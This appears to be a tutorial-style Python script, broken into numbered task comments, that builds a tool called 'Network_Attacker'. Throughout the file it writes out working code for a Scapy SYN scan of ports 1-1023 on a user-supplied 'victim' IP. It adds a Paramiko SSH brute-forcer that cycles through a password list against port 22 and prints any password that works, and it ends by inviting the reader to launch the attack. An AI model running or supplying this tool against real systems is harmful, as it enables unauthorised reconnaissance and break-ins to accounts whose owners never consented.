#####################################################################################################################
#   TASK No.1: Under a new Python project folder, we’ve just created a Python file named "Network_Attacker".        #
#   From now on, we can start populating it with our code.                                                          #
#####################################################################################################################

#####################################################################################################################
#   TASK No.2: Without further ado, let’s import a Scapy library from the third-party repository.                   #
#####################################################################################################################

import scapy.all as scapy

#####################################################################################################################
#   TASK No.3: To make sure that all the necessary subroutines are at our disposal, we need to put the following    #
#   code block into our programme:                                                                                  #
#####################################################################################################################

from scapy.layers.inet import TCP, IP, ICMP
from scapy.sendrecv import sr, sr1
from scapy.volatile import RandShort
from scapy.config import conf

#####################################################################################################################
#   TASK No.4: At this point, let’s declare a variable named "Target" and initialize it with a function reading     #
#   user input from the console.                                                                                    #
#####################################################################################################################

Target = input("Please enter IP address of the victim's machine: ")

#####################################################################################################################
#   TASK No.5: Afterwards, we’re instructed to create a variable named "Registered_Ports" that stores integers      #
#   ranging from 1 to 1023 – which are in fact a set of well-known ports, leaving out, however, the port number 0   #
#   as originally unintended to be assigned to any specific service or application.                                 #
#####################################################################################################################

Registered_Ports = range(1, 1024)

#####################################################################################################################
#   TASK No.6: Our next exercise is to build an empty list named "open_ports".                                      #
#####################################################################################################################

open_ports = []

#####################################################################################################################
#   TASK No.7: Later on, let’s create a function named "scanport" which accepts an argument in the form of a        #
#   variable named "port". As for the body of the function in question, we’re to put therein a variable acting as   #
#   the source port which accepts randomly generated number from a dedicated Scapy subroutine.                      #
#####################################################################################################################

def scanport(port):
    Source_Port = RandShort()
    print(Source_Port)

#####################################################################################################################
#   TASK No.8: Subsequently, we have to call a configuration variable named "conf.verb" and set its value to 0 in   #
#   order to minimize a verbosity of the output produced by Scapy subroutines.                                      #
#####################################################################################################################

    conf.verb = 0

#####################################################################################################################
#   TASK No.9: At this stage, we are to build a variable named "SynPkt" and populate it with a Scapy subroutine     #
#   which sends a crafted packet to a specified target and waits for the first response.                            #
#####################################################################################################################

    SynPkt = sr1(IP(dst=Target) / TCP(sport=Source_Port, dport=port, flags="S"), timeout=0.5)

#####################################################################################################################
#   TASK No.10: In this exercise, we continue populating the body of a function named "scanport". On this occasion, #
#   we need to create a conditional statement which checks whether a variable named "SynPkt" is empty – if that’s   #
#   the case, then our programme shall return "False".                                                              #
#####################################################################################################################

    if not SynPkt:
        return False

#####################################################################################################################
#   TASK No.11: Our next assignment is to carry on with checking the contents of a function named "scanport" and    #
#   verify whether it is lacking a TCP layer module – if so, then our logical test should return "False".           #
#####################################################################################################################

    if not SynPkt.haslayer(TCP):
        return False

#####################################################################################################################
#   TASK No.12: Otherwise, if the presence of such module is confirmed, then let’s examine it further and check     #
#   whether it receives a SYN-ACK flag upon an attempt to communicate with the victim’s machine.                    #
#####################################################################################################################

    elif SynPkt[TCP].flags == 0x12:

#####################################################################################################################
#   TASK No.13: Provided that the above condition is met, let’s reset the successfully established connection by    #
#   sending an RST flag to our victim and make the programme return "True".                                         #
#####################################################################################################################

        sr(IP(dst=Target) / TCP(sport=Source_Port, dport=port, flags="R"), timeout=2)
        return True
    else:
        return False

#####################################################################################################################
#   TASK No.14: Let’s build another function whose objective is to inspect availability of the victim's machine.    #
#####################################################################################################################

def target_availability():

#####################################################################################################################
#   TASK No.15: We’re about to insert the mechanics of the newly created function inside a "try-except" block which #
#   is responsible for handling any potential errors should they occur whilst executing the above function.         #
#####################################################################################################################

#####################################################################################################################
#   TASK No.16: We also need to make sure that the "except" clause at the end of our function alerts us about an    #
#   encountered exception, should there be any, and returns False.                                                  #
#####################################################################################################################

#####################################################################################################################
#   TASK No.17: Once again, we have to call a configuration variable named "conf.verb" and set its value to 0 in    #
#   order to minimize a verbosity of the output produced by Scapy subroutines.                                      #
#####################################################################################################################

    try:
        conf.verb = 0

#####################################################################################################################
#   TASK No.18: Now, let’s invoke an ICMP module which is supposed to ping our pre-defined target and thereby check #
#   its availability.                                                                                               #
#####################################################################################################################

        ping = sr1(IP(dst=Target) / ICMP(), timeout=3)

#####################################################################################################################
#   TASK No.19: Upon a confirmation of the victim’s availability, our function shall return "True" at the end of    #
#   "try" clause.                                                                                                   #
#####################################################################################################################

        if ping:
            return True
    except Exception as exception:
        print(f"Exception: {exception}")
        return False

#####################################################################################################################
#   TASK No.20: Since our pinging function is ready, let’s pass its outcomes to a brand-new conditional statement.  #
#####################################################################################################################

if target_availability():
    print(f"Scanning ports at {Target}. Please standby...")

#####################################################################################################################
#   TASK No.21: Next, we have to build a loop iterating over the whole range of a variable named port.              #
#####################################################################################################################

    for port in Registered_Ports:

#####################################################################################################################
#   TASK No.22: In this exercise, we must pass a variable named "port" to a function named "scanport" and assign    #
#   the latter to a new variable named "status".                                                                    #
#####################################################################################################################

        status = scanport(port)

#####################################################################################################################
#   TASK No.23: In this section, our programme should notify us about the value of a variable named "port" and      #
#   append it to a list named "open_ports" under the condition that a variable named "status" returns "True".       #
#####################################################################################################################

        if status:
            open_ports.append(port)
            print(f"Open port found: {port}")

#####################################################################################################################
#   TASK No.24: As soon as the port scanning is finished, let’s explicitly notify the user about this fact.         #
#####################################################################################################################

    print("Scanning complete!")

else:
    print(f"Victim at {Target} is unavailable.")

#####################################################################################################################
#   TASK No.25: Now, we need to import a Paramiko library from the third-party repository.                          #
#####################################################################################################################

import paramiko

#####################################################################################################################
#   TASK No.26: In this step, let’s create a function named "BruteForce" which accepts an argument in the form of a #
#   variable named "port".                                                                                          #
#####################################################################################################################

def BruteForce(port):

#####################################################################################################################
#   TASK No.27: Next, we have to create a method which opens a text file named "PasswordList".                      #
#####################################################################################################################

    with open("PasswordList.txt", "r") as f:

#####################################################################################################################
#   TASK No.28: Later on, let’s build a variable which extracts passwords out of a text file named "PasswordList".  #
#####################################################################################################################

        passwords = f.read().splitlines()

#####################################################################################################################
#   TASK No.29: Under the "with" method, let’s create one variable named "user" to allow the user to select the SSH #
#   server's login username.                                                                                        #
#####################################################################################################################

    user = input("Enter the victim's username: ")

#####################################################################################################################
#   TASK No.30: At this point, we must create a variable named "SSHconn" that equals to the "paramiko.SSHClient()". #
#####################################################################################################################

    SSHconn = paramiko.SSHClient()

#####################################################################################################################
#   TASK No.31: Afterwards, let’s apply the ".set_missing_host_key_policy(paramiko.AutoAddPolicy())" function to a  #
#   variable named "SSHconn".                                                                                       #
#####################################################################################################################

    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())

#####################################################################################################################
#   TASK No.32: Subsequently, we have to build a loop iterating over each value in a variable named "passwords".    #
#####################################################################################################################

    for password in passwords:

#####################################################################################################################
#   TASK No.33: We are also instructed to wrap the body of our loop with a try-except block. In case of an          #
#   exception, the except clause will print "<The password variable> failed."                                       #
#####################################################################################################################

#####################################################################################################################
#   TASK No.34: Now, let’s connect to SSH using the following syntax:                                               #
#####################################################################################################################

        try:
            SSHconn.connect(Target, port=int(port), username=user, password=password, timeout=1)

#####################################################################################################################
#   TASK No.35: In this part of our loop, we need to print the correct password along with a success message…       #
#####################################################################################################################

            print(f"Password: {password} - Success :)")

#####################################################################################################################
#   TASK No.36: … and close the connection with the following method:                                               #
#####################################################################################################################

            SSHconn.close()

#####################################################################################################################
#   TASK No.37: At long last, we can break the loop.                                                                #
#####################################################################################################################

            break
        except Exception as e:
            print(f"Password: {password} - Failure :(")

#####################################################################################################################
#   TASK No.38: Now, let’s create another conditional statement which checks whether the port number 22 is present  #
#   under a list named "open_ports".                                                                                #
#####################################################################################################################

if 22 in open_ports:

#####################################################################################################################
#   TASK No.39: If the port 22 is open, it triggers a script asking the user about the further course of action.    #
#####################################################################################################################

    BruteForceQuery = input("Port 22 is open. Would you like to perform a brute-force attack against it? (y/n): ")

#####################################################################################################################
#   TASK No.40: If the user responds with a "y", let’s invoke a function named "BruteForce" which accepts the port  #
#   22 as an argument.                                                                                              #
#####################################################################################################################

    if BruteForceQuery.lower() == "y":
        BruteForce(22)

#####################################################################################################################
#   TASK No.41: Alrighty, we’re ready to run the script and launch the attack :)                                    #
#####################################################################################################################
